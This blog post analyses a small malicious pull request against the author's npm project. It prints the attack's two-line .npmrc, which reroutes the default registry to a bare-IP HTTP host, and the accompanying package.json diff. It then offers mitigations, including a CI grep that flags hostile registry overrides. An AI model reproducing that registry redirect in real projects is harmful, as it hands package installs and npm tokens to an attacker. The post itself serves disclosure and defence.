---
layout: post
title: "A Rogue Registry in My Own Backyard: Anatomy of a Two-Line Supply Chain Attack"
date: 2026-06-27 22:30:09 +0000
permalink: "/2026/06/27/a-rogue-registry-in-my-own-backyard-anatomy-of-a-two-line-supply-chain-attack/"
description: "The previous parts of this series were written from a comfortable distance. I read the Trend Micro..."
tags: [npm, security, supplychain]
og_type: article
image: "/assets/posts/a-rogue-registry-in-my-own-backyard-anatomy-of-a-two-line-supply-chain-attack/cover.png"
devto_url: "https://dev.to/sebs/a-rogue-registry-in-my-own-backyard-anatomy-of-a-two-line-supply-chain-attack-5b0h"
render_with_liquid: false
---
The previous parts of this series were written from a comfortable distance. I read the Trend Micro diagrams about Shai-Hulud, I theorised about Docker network egress and rolling keys, and I lectured everyone about phishing training while quietly assuming it would happen to other people's repositories. The universe, being the comedian it is, decided to file a pull request against `sebs/etherscan-api` to correct that assumption.

This one is worth a writeup precisely because it is *small*. No worm, no self-replicating bash, no 200-line obfuscated payload. Six lines added, three removed, across two files. If you reviewed it at 23:00 with one eye open, you would merge it. That is the whole point of it, and that is why it belongs in this series.

## The bait

The PR arrived titled `refactor: replace manual multicall with ethers-multicall-utils`. The description is a thing of beauty in the way that all good lies are tidy:

> This PR integrates `ethers-multicall-utils` to improve performance of multi-contract reads.
> - Reduces network latency
> - Works with all EVM chains
> - Zero dependencies

Read that again. It is fluent in the dialect of the modern PR. It has bullet points. It says "zero dependencies," which is the magic phrase that makes a security-minded maintainer relax their shoulders — the previous post in this series was literally me preaching about minimal package footprint, and here is a contributor seemingly speaking my language back to me. That is not a coincidence. The social engineering is calibrated for the target.

The author account was not a five-minute-old burner either. Aged profile, hundreds of repos, an Arctic Code Vault badge, Pull Shark, a believable bio, a real-looking employer. Everything about the envelope says "competent open-source human." Everything in the envelope says otherwise.

## The actual payload

Here is the entire attack. First, a brand new `.npmrc` appears in the repo root:

```ini
registry=https://registry.npmjs.org/
:registry=http://206.223.232.170:64389/
```

The first line is decoration. It points at the real npm registry and exists purely so the file looks reasonable to a skimming eye.

The second line is the knife. The empty-scope syntax `:registry=` sets the **default** registry for everything that does not carry an explicit scope. So the net effect of those two lines together is: ignore the line above, and resolve packages from `http://206.223.232.170:64389/` instead.

Three things should set your hair on fire here:

1. It is a **bare IP address**, not a registry hostname. Legitimate registries have names. Names have TLS certificates. Names can be revoked. An IP on a high random port is somebody's box.
2. It is **plain `http://`**. No TLS at all. Whoever controls the wire — or simply controls that host — controls every byte npm pulls down, and any token npm sends up during install.
3. It overrides resolution for **the entire install**, not just the one shiny new dependency. Every package your build fetches now potentially comes from the attacker.

The second file change is `package.json`, and it is the fig leaf that makes the `.npmrc` look purposeful:

```diff
   "devDependencies": {
     "@types/node": "22.10.5",
     "typedoc": "0.28.19",
-    "typescript": "6.0.3"
+    "typescript": "6.0.3",
+    "ethers-multicall-utils": "^2.1.4"
   }
```

A new dependency is added that — surprise — does not need to exist on the real npm registry, because the `.npmrc` has already rerouted resolution to the attacker's server. They can serve whatever they like under that name: a package whose `postinstall` script runs their code, or a trojaned copy of something you already trust. The `^2.1.4` caret is a nice touch too — it pre-authorises any "newer" version they decide to push later.

There was also a cosmetic edit re-escaping the `ü` in my own name in the `author` field. Pure diff noise, there to make the commit read like a tidy housekeeping pass. I have rarely felt so personally tidied.

## Why this is the dangerous kind

The Shai-Hulud worm was loud. It propagated, it phoned home, it cloned private repos, and that noise is exactly what gets it caught and written up. This thing is the opposite design philosophy. It is quiet, it is two lines, and it weaponises *your own install command*. You do not need to be tricked into running anything exotic. You run `npm install`, the same way you have ten thousand times before, and the trap springs in your CI runner or on your laptop with your npm token sitting right there in the environment.

The chain, end to end:

```plaintext
plausible "perf refactor" PR
        │
        ▼
package.json adds a dependency that only resolves...
        │
        ▼
...from the registry hardcoded in .npmrc
        │
        ▼
http://<attacker-ip>:<port> serves a malicious package
        │
        ▼
install-time code execution, token harvest, or worse
```

Every link looks boring in isolation. That is the craft.

## What actually saved this repo

Nothing clever. The PR was reviewed by a human who looked at the files, not just the description, and asked the only question that matters when a PR touches install configuration: *why is there a registry line pointing at a random IP over HTTP?* There is no benign answer to that question. The PR was closed unmerged.

But "I happened to look" is not a control. Let us turn it into one.

## Mitigations, in roughly the order I would bother

**Treat `.npmrc` as a security-critical file.** It configures where your code *comes from*. That is at least as sensitive as a CI workflow file, and in the previous post I argued the `actions/` folder deserves CODEOWNERS and branch protection. `.npmrc` deserves exactly the same paranoia. Put it behind CODEOWNERS so any change to it requires a human you trust.

**Add a CI check that refuses hostile registry config.** A grep is enough to start. Fail the build if an `.npmrc` anywhere in the tree points at a non-HTTPS registry or a bare IP:

```bash
# fail if any .npmrc references a non-https or IP-based registry
if git grep -nE 'registry\s*=\s*https?://' -- '**/.npmrc' \
   | grep -vE '=\s*https://([a-z0-9.-]+\.)?(npmjs\.org|your-private-registry\.example)/' ; then
  echo "Suspicious registry override detected in .npmrc"
  exit 1
fi
```

Tune the allowlist to your actual registries. The point is that *new* registry endpoints become a deliberate, reviewed event rather than something that rides in on a refactor.

**Pin and verify what you install.** A committed lockfile plus `npm ci` (not `npm install`) in CI means resolution follows the lockfile, and a foreign registry URL in there is glaring in review. `--ignore-scripts` in CI where you can get away with it removes the install-time code execution primitive that most of these attacks ultimately rely on.

**Build in a box with a short leash.** This is the same advice as part one, and this attack is a clean example of why it works: if your build container can only reach your known registry and nothing else, a redirect to `206.223.232.170:64389` simply fails to connect. The exfiltration and the malicious fetch both die at the network boundary. DNS/egress allowlisting is not glamorous and it quietly defeats a whole category of this.

**Review the diff, never the description.** The PR text is written by the attacker. It is marketing copy. The only ground truth is the files changed tab. If a "performance" or "dependency" PR touches `.npmrc`, `package.json` install config, lifecycle scripts, or a workflow file, the description becomes irrelevant and the change earns full scrutiny regardless of how friendly the bullet points were.

**Assume the friendly account might not be its owner.** An aged profile with good badges is not a trust signal anymore; it is an *attack asset*, because hijacked reputable accounts are precisely what makes a malicious PR slide through. "Assume breach" applies to your contributors' credentials, not just your own.

## The uncomfortable part

I write a series about supply chain security and someone still walked a registry-hijack PR right up to my front door. That is not a failure of the series; that is the actual threat model. These attacks are cheap, automated, and sprayed across hundreds of repositories at once on the statistical certainty that *someone* merges at 23:00 with one eye open. You do not have to be careless to get got. You just have to be tired once.

So make the boring controls do the watching for you, because your attention is the resource the attacker is budgeting against.

To misquote the same wise machine I closed part one with:

> The only winning move is to not run `npm install`.
